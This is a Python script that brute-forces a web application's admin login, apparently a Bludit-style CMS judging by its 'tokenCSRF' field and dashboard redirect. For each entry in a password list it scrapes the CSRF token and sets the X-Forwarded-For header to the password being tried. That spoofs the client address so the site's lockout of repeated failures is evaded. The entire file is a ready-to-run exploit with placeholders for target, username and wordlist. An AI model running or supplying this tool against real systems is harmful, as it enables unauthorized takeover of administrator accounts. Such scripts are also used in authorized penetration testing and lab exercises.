#!/usr/bin/env python3
import re
import time
import requests

DELAY = 0.25
SKIP = 0
HOST = "http://127.0.0.1"  # change to the appropriate URL

LOGIN_URL = HOST + "/admin/login"
USERNAME = "admin"  # Change to the appropriate username
PASSWORDFILE = "passwords.txt"  # change this to the appropriate file you can specify the full path to the file
print("Reading password list...")
with open(PASSWORDFILE) as f:
    content = f.readlines()
    wordl = [x.strip() for x in content]
wordlist = wordl

size = len(wordlist)
print("Read {} passwords".format(size))

i = 0
for password in wordlist:
    i += 1
    if i < SKIP:
        continue
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    csrf_token = re.search(
        'input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text
    ).group(1)

    print("[{}/{}][*] Trying: {}".format(i, size, password))

    headers = {
        "X-Forwarded-For": password,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Referer": LOGIN_URL,
    }

    data = {
        "tokenCSRF": csrf_token,
        "username": USERNAME,
        "password": password,
        "save": "",
    }

    login_result = session.post(
        LOGIN_URL, headers=headers, data=data, allow_redirects=False, timeout=10
    )

    if "location" in login_result.headers:
        if "/admin/dashboard" in login_result.headers["location"]:
            print()
            print("SUCCESS: Password found!")
            print("Use {}{} to login.".format(USERNAME, password))
            print()
            break
    else:
        time.sleep(DELAY)
